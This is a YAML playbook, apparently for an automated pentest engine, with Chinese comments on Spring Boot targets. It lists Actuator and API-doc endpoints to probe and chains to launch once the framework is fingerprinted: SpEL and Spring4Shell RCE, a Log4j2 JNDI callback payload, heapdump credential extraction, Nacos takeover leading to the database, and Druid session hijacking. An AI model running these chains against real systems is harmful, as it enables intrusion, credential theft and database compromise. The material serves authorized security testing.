# Playbook: Spring Boot (Java)
# 触发: fingerprints.yaml -> spring-boot
#
# 核心认知(治 "打开是 Spring 报错页就收工" 这个头号错误):
#   Spring Boot 默认错误页只说明 "当前请求没命中业务",不说明 "无攻击面"。
#   必须继续:判响应来自哪层 -> 探路由/方法/CT 差异 -> 挖 actuator/文档 -> 建接口表。
#
# 每个 check 带 why(为什么测) + how(engine 怎么发) + signal(什么响应算命中)。
# 命中后如何深钻见 escalate。schema 见 README。

playbook: spring-boot
identity: "Spring Boot (Java)"

# 先回答:这个 Spring 报错页是根路径异常,还是所有路径异常? 请求进到哪一层了?
recon_first:
  - "对 / 和几个随机路径分别发包,对比 404/500/whitelabel 差异,判断异常范围"
  - "对同一路径试 GET/POST/PUT/DELETE/OPTIONS,看 405/Allow 头 -> 路径是否存在、支持啥方法"
  - "对同一路径试 Accept: application/json vs text/html,看错误体格式是否变(判 API vs 页面)"
  - "看错误响应是否泄露: 类名/包名/SQL/内部路径/trace-id/下游服务名"

checks:
  - id: actuator-exposure
    why: "Spring Boot Actuator 常被忘记关或鉴权不全,是最高频高价值暴露面"
    how: "对下列端点逐个 GET 发包存证(engine/http_client.py)"
    endpoints:
      # 2.x/3.x 标准
      - /actuator
      - /actuator/health
      - /actuator/env
      - /actuator/beans
      - /actuator/mappings   # ← 直接吐出全部路由,等于免费接口清单
      - /actuator/configprops
      - /actuator/heapdump   # ← 可下载堆转储,提内存中的凭证
      - /actuator/threaddump
      - /actuator/loggers
      - /actuator/gateway/routes  # Spring Cloud Gateway 路由
      - /actuator/httptrace  # 近期请求,可能含他人 token
      # 1.x 遗留(无 /actuator 前缀)
      - /env
      - /health
      - /beans
      - /mappings
      - /heapdump
      - /jolokia/list        # Jolokia -> JMX -> 可能 RCE
    signal: "200 且返回 JSON 结构(非 whitelabel);/env /heapdump 命中即高危"
    escalate: "/env 找 spring.datasource / 密钥;/heapdump 下载后离线提凭证;/mappings 回灌接口表"

  - id: api-docs-exposure
    why: "Swagger/OpenAPI 泄露会直接给出全量接口+参数,免去 JS 挖掘"
    how: "GET 下列文档端点"
    endpoints:
      - /swagger-ui.html
      - /swagger-ui/
      - /v2/api-docs
      - /v3/api-docs
      - /openapi.json
    signal: "200 返回 swagger JSON / UI"
    escalate: "解析出全部接口 -> 回灌接口表 -> 走分诊/FUZZ/越权"

  - id: route-recovery-no-js
    why: "纯 API / 无 SPA 时,接口不在 JS 里,靠路由探测和报错回填"
    how: "结合 actuator/mappings、api-docs、错误信息里出现的 controller/字段名构造候选路径发包"
    signal: "404->401(受保护接口) / 404->405(路径在方法不对) / 固定错误->参数校验错误(进业务链)"
    escalate: "401/403 的接 shiro / spring-security playbook 做鉴权绕过"

# ========== 确定性攻击链（反射档：指纹一确定,这些链直接展开打）==========
# 这是框架组件域的灵魂:组件识别 → 组件漏洞 → 漏洞串联。
# 每条链 = 触发条件 + 逐环节 + 环节间的产物流动(一环产出喂下一环)。
# 命中 Spring Boot 后,按适用性直接展开,不必逐条写 Q1-Q5 作文(反射档)。
chains:
  - id: spel-rce
    name: "Spring Cloud Gateway SpEL 注入 RCE"
    trigger: "存在 /actuator/gateway/routes 或确认使用 Spring Cloud Gateway"
    cve: CVE-2022-22947
    steps:
      - "POST 恶意 route(含 SpEL 表达式)到 gateway actuator"
      - "refresh 触发表达式执行"
      - "非破坏性验证:执行 id/whoami"
    note: "仅模式参考,命中需实测;RCE 止于非破坏性验证"

  - id: spring4shell
    name: "Spring Core 参数绑定 RCE"
    trigger: "Spring MVC + JDK9+ + 可 war 部署(Tomcat)"
    cve: CVE-2022-22965
    steps:
      - "构造 class.module.classLoader.* 参数污染写 webshell"
      - "访问写入的 shell 验证"
    note: "条件严格(war/tomcat),不满足则标不适用+理由"

  - id: log4j2-jndi
    name: "Log4j2 JNDI 注入 RCE"
    trigger: "任意可被日志记录的输入点(UA/参数/header)"
    cve: CVE-2021-44228
    steps:
      - "在输入点注入 ${jndi:ldap://OOB} -> 走 OOB 回连验证(DNS/LDAP 日志)"
      - "确认回连后再评估 RCE"
    note: "OOB 证据(回连日志)与响应同等有效(L1 准则一)"

  - id: fastjson-deser
    name: "FastJSON 反序列化"
    trigger: "参数传 JSON;构造恶意/畸形 JSON 触发报错,报错特征指向 FastJSON"
    steps:
      - "先探版本:畸形 JSON 报错里的 com.alibaba.fastjson 栈特征"
      - "按版本选链(autoType 绕过链),OOB 或非破坏性验证"
    note: "先确认是 FastJSON 再打;版本决定用哪条链"

  - id: actuator-to-nacos-db
    name: "Actuator → Nacos 接管 → 拿DB/改配置（跨环节串联链）"
    trigger: "actuator-exposure check 命中 /env 或 /actuator/env"
    steps:
      - "/env 或 /heapdump 提取:Nacos 地址、账号、密钥、spring.datasource"
      - "→ 产物写入 intel(供 infra 域 nacos check 直接用)"
      - "→ 用凭证接管 Nacos(见 domains/infra/middleware.yaml nacos-unauth)"
      - "→ 读/改配置拿 DB 连接串 → 连 DB(非破坏性验证读一张非敏感表)"
    note: "这是 framework→infra 跨域串联的典型:一个 Actuator 暴露串出 DB 沦陷"

  - id: heapdump-secret
    name: "heapdump → 提取内存密钥"
    trigger: "actuator-exposure 命中 /heapdump 或 /actuator/heapdump"
    steps:
      - "下载 heapdump(走 http_client 存证)"
      - "离线用 MAT/字符串提取:token/AK-SK/DB密码/session"
      - "→ 提取物写入 intel(供各域复用,如 OSS AK 交 app 域打对象存储)"

  - id: druid-session
    name: "Druid 未授权 → 劫持 session 登录后台"
    trigger: "存在 /druid/ 路径"
    steps:
      - "见 domains/infra/middleware.yaml druid-unauth"
      - "→ 劫持的 session 写入 intel,供 app 域带 session 打后台接口"

cve_note: "识别出具体 Spring Boot 版本后必须查 CVE(如 Spring4Shell CVE-2022-22965 需 war+特定条件),按 L1 反幻觉:编号可溯源、适用性落到实测特征,拿不准标 疑似·待核实"
